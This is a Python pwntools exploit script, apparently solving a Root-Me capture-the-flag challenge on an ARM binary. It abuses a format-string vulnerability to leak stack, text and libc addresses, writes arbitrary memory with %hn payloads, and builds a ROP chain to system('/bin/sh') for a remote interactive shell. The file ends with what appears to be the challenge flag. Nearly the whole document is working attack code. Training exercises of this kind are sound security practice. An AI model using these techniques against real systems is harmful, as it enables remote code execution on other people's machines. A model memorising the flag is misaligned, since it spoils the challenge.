#!/usr/bin/python


def read_saved(path):
    content = open(path).read().split('\n')
    n = int(content[0])
    t = []
    i = 0
    cur = 1
    while i<len(content):
        if content[cur] == '' or content[cur] == '0':
            break
        n = int(content[cur])
        cur += 1
        t.append({})
        for j in range(n):
            t[i][content[cur+j*2]] = int(content[cur+j*2+1])
        cur += 2*n
        i += 1
    return n,t

def print_leaked(t):
    c = 1
    for i in t:
        print(str(c)+" => "+str(len(i)))
        for u in i:
            print("       "+u+" : "+str(i[u]))
        c += 1

def save_table(t, path):
    f = open(path, "w")
    f.write(str(len(t))+"\n")
    for i in t:
        f.write(str(len(i))+"\n")
        for u in i:
            f.write(u+"\n")
            f.write(str(i[u])+"\n")

def add_entry(t, i, key):
    if t[i].get(key) is not None:
        t[i][key] += 1
    else:
        t[i][key] = 1

def transfom_output_to_leak(output):
    o = output.split(' ')[0]
    return int(o, 16)

def send_payload(payload, r):
    log.info("payload = %s" % repr(payload))
    r.sendline(payload)
    received = r.recv()
    if len(received)<100:
        log.info("received = %s" % repr(received))
    else:
        log.info("received too long to be printed")
    return received.split(' is inco')[0]

def leak(addr, leak_offset, r):
    tmp = send_payload(p32(addr)+"%"+str(leak_offset)+"$s", r)
    return tmp.split(p32(addr))[1]

def leak_write_conditions(addr, leak_offset, r):
    tmp = send_payload("%40d"+p32(addr)+"%"+str(leak_offset+1)+"$s", r)
    return tmp.split(p32(addr))[1]

def write_shotgun(leak_offset, r):
    send_payload("%14629d%"+str(leak_offset)+"$hn", r)
    while 'Password' not in r.recv():
        pass

def write_addr(addr, to_write, leak_offset, r, receive_until=True):
    part1 = to_write&0xffff
    part2 = (to_write>>16)&0xffff
    written1 = (part1-8+0x10000)%0x10000
    send_payload(p32(addr)+p32(addr+2)+"%"+str(written1)+"d"+"%"+str(leak_offset)+"$hn"+"%"+str((part2-part1+0x10000)%0x10000)+"d%"+str(leak_offset+1)+"$hn", r)
    while receive_until and 'Password' not in r.recv():
        pass

from pwn import *
import binascii

X = 100
N = 10

context.log_level = 'info'

counter, leaked_table = read_saved("stack_saved")
print_leaked(leaked_table)

# try:
#     counter, leaked_table = read_saved("stack_saved")
#     leaked_table.append({})
# except:
#     leaked_table = [{}]
#
# counter = len(leaked_table)
# session_counter = 0
# while counter<X:
#     if session_counter%5 == 0:
#         r = remote('challenge04.root-me.org', 61052)
#         print(r.recv())
#
#     r.sendline("%"+str(counter)+"$p")
#     received = r.recv()
#     o = received.split(' ')[0]
#     add_entry(leaked_table, counter-1, o)
#     print("=================")
#     print_leaked(leaked_table)
#
#     session_counter += 1
#     if session_counter>=N:
#         counter += 1
#         session_counter = 0
#         leaked_table.append({})
#
# save_table(leaked_table, "stack_saved")

STRCMP_TO_SYSTEM = -166352

leak_offset = 7
format_offset = 49
format_offset_fastest = 5
offset_stack_leak = 45
offset_text = 43
offset_libc = 12

r = remote('challenge04.root-me.org', 61052)
r.recv()

# r.sendline("%"+str(5)+"$p")
# addr = transfom_output_to_leak(r.recv())
# print("[+] Got leak to stack : "+hex(env))
#
# leaked = leak(env, leak_offset, r)
# print(leaked)
# print(binascii.hexlify(leaked))
#
# previous lines were die-retry in order to find the "5" that matches the place of "%12s" string in stack

write_shotgun(5, r)  # permit to bypass %12s to %92s

r.sendline("%"+str(offset_stack_leak)+"$p%"+str(offset_text)+"$p%"+str(offset_libc)+"$p")
t = r.recv().split('0x')

if t[0] == '' or t[0][0] == ' ':
    env = ''.join([t[i] for i in range(1, len(t))])
else:
    env = ''.join(t)

stack = transfom_output_to_leak(env[:8])
text = transfom_output_to_leak(env[8:16])
libc = transfom_output_to_leak(env[16:24])
print("[+] Got leak to stack : "+hex(stack))
print("[+] Got leak to text : "+hex(text))
print("[+] Got leak to libc : "+hex(libc))

ret = stack-400
format_addr = ret+24

# leaked = leak(format_addr, leak_offset, r)
# print(leaked)
# print(binascii.hexlify(leaked))
#
# print(send_payload("%p"*40, r))
#
# previous lins confirms "%92s" replaced "%12s"

# write_addr(format_addr+4, 0x1337babe, leak_offset, r)
#
# leaked = leak(format_addr, leak_offset, r)
# print(leaked)
# print(binascii.hexlify(leaked))
#
# previous lines proove we can write anywhere

got_strcmp = (text&0xfffff000)+0x10fb0
leaked = leak(got_strcmp, leak_offset, r)
strcmp = u32(leaked[:4])
system = strcmp+STRCMP_TO_SYSTEM

# leaked = leak(system, leak_offset, r)
# print(leaked)
# print(binascii.hexlify(leaked))

reset_counter_address = ret+0x14
# write_addr(reset_counter_address, 1, leak_offset, r)
#
# leaked = leak(reset_counter_address, leak_offset, r)
# print(leaked)
# print(binascii.hexlify(leaked))
#
# previous lines proove we can reset counter

pop_r0_r4_pc = system+172731 # scp -P 2224 app-systeme-ch52@challenge04.root-me.org:/lib/arm-linux-gnueabihf/libc.so.6 lib.so et ROPgadget pour pop_r0_r4_pc
bin_sh = system+645824

# write_addr(reset_counter_address, 1, leak_offset, r)
#
# leaked = leak(pop_r0_r4_pc, leak_offset, r)
# print(leaked)
# print(binascii.hexlify(leaked))
#
# leaked = leak(bin_sh, leak_offset, r)
# print(leaked)
# print(binascii.hexlify(leaked))
#
# previous lines shows there is what is expected

write_addr(reset_counter_address, 1, leak_offset, r)
write_addr(ret+4, bin_sh, leak_offset, r)
write_addr(ret+8, 0xdeadbeef, leak_offset, r)
write_addr(reset_counter_address, 1, leak_offset, r)
#write_addr(ret+0xc, (text&0xfffff000)+0xc44, leak_offset, r)
write_addr(ret+0xc, system, leak_offset, r)
write_addr(ret, pop_r0_r4_pc, leak_offset, r, False)

r.interactive()

#m1tig4ti0ns_dOnt_pr3vent_stup1dity
